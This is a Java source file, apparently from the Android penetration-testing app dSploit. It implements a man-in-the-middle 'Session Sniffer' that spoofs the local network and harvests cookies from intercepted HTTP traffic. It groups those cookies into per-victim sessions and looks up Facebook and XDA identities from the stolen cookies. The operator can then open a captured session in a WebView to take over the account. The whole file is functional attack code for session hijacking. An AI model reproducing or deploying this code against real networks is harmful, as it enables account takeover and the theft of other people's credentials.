/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package it.evilsocket.dsploit.plugins.mitm;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.HashMap;

import org.apache.http.impl.cookie.BasicClientCookie;
import org.json.JSONObject;

import it.evilsocket.dsploit.R;
import it.evilsocket.dsploit.core.System;
import it.evilsocket.dsploit.gui.dialogs.ConfirmDialog.ConfirmDialogListener;
import it.evilsocket.dsploit.gui.dialogs.ConfirmDialog;
import it.evilsocket.dsploit.net.http.RequestParser;
import it.evilsocket.dsploit.net.http.proxy.Proxy.OnRequestListener;
import it.evilsocket.dsploit.plugins.mitm.SpoofSession.OnSessionReadyListener;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.View.OnClickListener;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.ArrayAdapter;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ToggleButton;

import com.actionbarsherlock.app.SherlockActivity;
import com.actionbarsherlock.view.MenuItem;

public class Hijacker extends SherlockActivity
{
	private ToggleButton 	   mHijackToggleButton = null;
	private ProgressBar	 	   mHijackProgress     = null;
	private ListView 		   mListView    	   = null;		
	private SessionListAdapter mAdapter			   = null;
	private boolean	     	   mRunning			   = false;	
	private SpoofSession	   mSpoof			   = null;
	
	public static class Session
	{
		public Bitmap								mPicture   = null;
		public String								mUserName  = null;
		public boolean								mInited	   = false;
		public String 			 					mAddress   = "";
		public String 			 					mDomain    = "";
		public String								mUserAgent = "";
		public HashMap< String, BasicClientCookie > mCookies   = null;
		
		public Session() {
			mCookies = new HashMap< String, BasicClientCookie >();
		}
	}
	
	private static int getFaviconFromDomain( String domain )
	{
		if( domain.contains("amazon.") )
			return R.drawable.favicon_amazon;
		
		else if( domain.contains( "google." ) )
			return R.drawable.favicon_google;
		
		else if( domain.contains( "youtube.") )
			return R.drawable.favicon_youtube;
		
		else if( domain.contains( "blogger." ) )
			return R.drawable.favicon_blogger;
		
		else if( domain.contains( "tumblr." ) )
			return R.drawable.favicon_tumblr;
		
		else if( domain.contains( "facebook.") )
			return R.drawable.favicon_facebook;
		
		else if( domain.contains( "twitter." ) )
			return R.drawable.favicon_twitter;
		
		else if( domain.contains( "xda-developers." ) )
			return R.drawable.favicon_xda;
		
		else
			return R.drawable.favicon_generic;
	}

	public class SessionListAdapter extends ArrayAdapter<Session> 
	{
		private int 					   mLayoutId = 0;
		private HashMap< String, Session > mSessions = null;
		
		private class FacebookUserTask extends AsyncTask<Session, Void, Boolean> 
		{
			private Bitmap getUserImage( String uri ) {
			    Bitmap image = null;
			    try 
			    {
			        URL 		  url  = new URL( uri );
			        URLConnection conn = url.openConnection();
			        conn.connect();
			        
			        InputStream 		input  = conn.getInputStream();
			        BufferedInputStream reader = new BufferedInputStream( input );
			        
			        image = Bitmap.createScaledBitmap( BitmapFactory.decodeStream( reader ), 48, 48, false );
			        
			        reader.close();
			        input.close();
			    } 
			    catch( IOException e ) 
			    {
			        System.errorLogging( "HIJACKER", e );
			    } 
			    
			    return image;
			}
			
			private String getUserName( String uri ) {
				String username = null;
				
				try 
			    {
			        URL 		  url  = new URL( uri );
			        URLConnection conn = url.openConnection();
			        conn.connect();
			        
			        InputStream    input  = conn.getInputStream();
			        BufferedReader reader = new BufferedReader( new InputStreamReader( input ) );
			        String		   line   = null, 
			        			   data   = "";
			        
			        while( ( line = reader.readLine() ) != null )
			        	data += line;
			        			        
			        reader.close();
			        input.close();
			        
			        JSONObject response = new JSONObject( data );
			        
			        username = response.getString("name");
			    } 
			    catch( Exception e ) 
			    {
			        System.errorLogging( "HIJACKER", e );
			    } 
				
				return username;
			}
						
			@Override
			protected Boolean doInBackground(Session... sessions) {
				Session 			session = sessions[0];
				BasicClientCookie   user    = session.mCookies.get("c_user");
				
				if( user != null )
				{
					String fbUserId     = user.getValue(),
						   fbGraphUrl   = "https://graph.facebook.com/" + fbUserId + "/",
						   fbPictureUrl = fbGraphUrl + "picture";
					
					session.mUserName = getUserName( fbGraphUrl );
					session.mPicture  = getUserImage( fbPictureUrl );
				}
				
				return true;
			}			
		}
		
		private class XdaUserTask extends AsyncTask<Session, Void, Boolean> 
		{
			private Bitmap getUserImage( String uri ) {
			    Bitmap image = null;
			    try 
			    {
			        URL 		  url  = new URL( uri );
			        URLConnection conn = url.openConnection();
			        conn.connect();
			        
			        InputStream 		input  = conn.getInputStream();
			        BufferedInputStream reader = new BufferedInputStream( input );
			        
			        image = Bitmap.createScaledBitmap( BitmapFactory.decodeStream( reader ), 48, 48, false );
			        
			        reader.close();
			        input.close();
			    } 
			    catch( IOException e ) 
			    {
			        System.errorLogging( "HIJACKER", e );
			    } 
			    
			    return image;
			}
	
			@Override
			protected Boolean doInBackground(Session... sessions) {
				Session 			session  = sessions[0];
				BasicClientCookie   userid   = session.mCookies.get("bbuserid"),
									username = session.mCookies.get("xda_wikiUserName");
				
				if( userid != null )
					session.mPicture = getUserImage( "http://media.xda-developers.com/customavatars/avatar" + userid.getValue() + "_1.gif" );
				
				if( username != null )
					session.mUserName = username.getValue().toLowerCase();
									
				return true;
			}			
		}
		
		public class SessionHolder
	    {
			ImageView favicon;
			TextView  address;
			TextView  domain;
	    }
		
		public SessionListAdapter( int layoutId ) {
	        super( Hijacker.this, layoutId );
	        	       
	        mLayoutId = layoutId;
	        mSessions = new HashMap< String, Session >();
	    }
		
		public Session getSession( String address, String domain ) {
			return mSessions.get( address + ":" + domain );
		}
		
		public synchronized void addSession( Session session ) {
			mSessions.put( session.mAddress + ":" + session.mDomain, session );
		}
		
		public synchronized Session getByPosition( int position ) {
			return mSessions.get( mSessions.keySet().toArray()[ position ] );
		}
	
		@Override
		public int getCount(){
			return mSessions.size();
		}
		
		@Override
	    public View getView( int position, View convertView, ViewGroup parent ) {				
	        View 		row    = convertView;
	        SessionHolder holder = null;
	        Session session    = getByPosition( position );
	        
	        if( row == null )
	        {
	            LayoutInflater inflater = ( LayoutInflater )Hijacker.this.getSystemService( Context.LAYOUT_INFLATER_SERVICE );
	            row = inflater.inflate( mLayoutId, parent, false );
	            
	            holder = new SessionHolder();
	            
	            holder.favicon  = ( ImageView )row.findViewById( R.id.sessionIcon );
	            holder.address  = ( TextView )row.findViewById( R.id.sessionTitle );
	            holder.domain   = ( TextView )row.findViewById( R.id.sessionDescription );
	            
	            row.setTag( holder );	     	            	
	        }
	        else	        
	            holder = ( SessionHolder )row.getTag();
	        
            if( session.mInited == false )
        	{            	
        		session.mInited = true;
        	
        		if( session.mDomain.contains("facebook.") && session.mCookies.get("c_user") != null )
        			new FacebookUserTask().execute( session );
        		
        		else if( session.mDomain.contains("xda-developers.") && session.mCookies.get("bbuserid") != null )
        			new XdaUserTask().execute( session );
        	}
           

	        if( session.mPicture != null )
	        	holder.favicon.setImageBitmap( session.mPicture );
	        else
	        	holder.favicon.setImageResource( getFaviconFromDomain( session.mDomain ) );
	        
	        if( session.mUserName != null )
	        	holder.address.setText( session.mUserName );
	        else
	        	holder.address.setText( session.mAddress );
	        
        	holder.domain.setText( session.mDomain );
        	        	              	
	        return row;
	    }
	}
						
	public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);        
        setTitle( System.getCurrentTarget() + " > MITM > Session Sniffer" );
        setContentView( R.layout.plugin_mitm_hijacker );      
        getSupportActionBar().setDisplayHomeAsUpEnabled(true);
        
        mHijackToggleButton = ( ToggleButton )findViewById( R.id.hijackToggleButton );
        mHijackProgress	    = ( ProgressBar )findViewById( R.id.hijackActivity );
        mListView 		    = ( ListView )findViewById( R.id.listView );
        mAdapter		    = new SessionListAdapter( R.layout.plugin_mitm_hijacker_list_item );
        mSpoof				= new SpoofSession();
        
        mListView.setAdapter( mAdapter );
        mListView.setOnItemClickListener( new OnItemClickListener() {
			@Override
			public void onItemClick( AdapterView<?> parent, View view, int position, long id ) {
				final Session session = mAdapter.getByPosition( position );
				if( session != null )
				{
					new ConfirmDialog
					( 
						"Hijack Session", 
						mRunning ? "Stop sniffing and start session hijacking ?" : "Start session hijacking ?", 
						Hijacker.this, 
						new ConfirmDialogListener(){
							@Override
							public void onConfirm() {
								if( mRunning )
									setStoppedState();
								
								System.setCustomData( session );
								
								startActivity( new Intent( Hijacker.this, HijackerWebView.class ) );
							}
						} 
					).show();
				}
			}
		});
        
        mHijackToggleButton.setOnClickListener( new OnClickListener(){
			@Override
			public void onClick(View v) {
				if( mRunning )
				{
					setStoppedState();
				}
				else
				{
					setStartedState();
				}
			}} 
		);  
        
        System.getProxy().setOnRequestListener( new OnRequestListener() {			
			@Override
			public void onRequest( String address, String hostname, ArrayList<String> headers ) {
				ArrayList<BasicClientCookie> cookies = RequestParser.getCookiesFromHeaders( headers );
				
				// got any cookie ?
				if( cookies != null && cookies.size() > 0 )
				{					
					String domain = cookies.get(0).getDomain();
					
					if( domain == null || domain.isEmpty() )
					{
						domain = RequestParser.getBaseDomain( hostname );
						
						for( int i = 0; i < cookies.size(); i++ )
							cookies.get(i).setDomain( domain );
					}
					
					Session session = mAdapter.getSession( address, domain );
					
					// new session ^^
					if( session == null )
					{
						session = new Session();
						session.mAddress   = address;
						session.mDomain    = domain;		
						session.mUserAgent = RequestParser.getHeaderValue( "User-Agent", headers );
					}

					// update/initialize session cookies
					for( BasicClientCookie cookie : cookies )
					{
						session.mCookies.put( cookie.getName(), cookie );
					}
					
					final Session fsession = session;
					Hijacker.this.runOnUiThread( new Runnable() {
						@Override
						public void run(){
							mAdapter.addSession( fsession );
							mAdapter.notifyDataSetChanged();
						}							
					});	
				}
			}
		});     
	}
	
	private void setStartedState( ) {	
		mSpoof.start( new OnSessionReadyListener() {			
			@Override
			public void onSessionReady() {
				Hijacker.this.runOnUiThread( new Runnable() {					
					@Override
					public void run() {
						mHijackProgress.setVisibility( View.VISIBLE );
						mRunning = true;
						
						Toast.makeText( Hijacker.this, "Once you see realtime sessions on the list, click on them to start hijacking.", Toast.LENGTH_LONG ).show();	    
					}
				});
			}
		});
	}
	
	private void setStoppedState( ) {		
		mSpoof.stop();

		System.getProxy().setOnRequestListener( null );	    
		mHijackProgress.setVisibility( View.INVISIBLE );
		
		mRunning = false;
		mHijackToggleButton.setChecked( false );                			
	}
	
	@Override
	public boolean onOptionsItemSelected( MenuItem item ) 
	{    
		switch( item.getItemId() ) 
		{        
			case android.R.id.home:            
	         
				onBackPressed();
				
				return true;
	    	  
			default:            
				return super.onOptionsItemSelected(item);    
	   }
	}
	
	@Override
	public void onBackPressed() {
	    setStoppedState();		    
	    super.onBackPressed();
	    overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_left);	    	    
	}
}
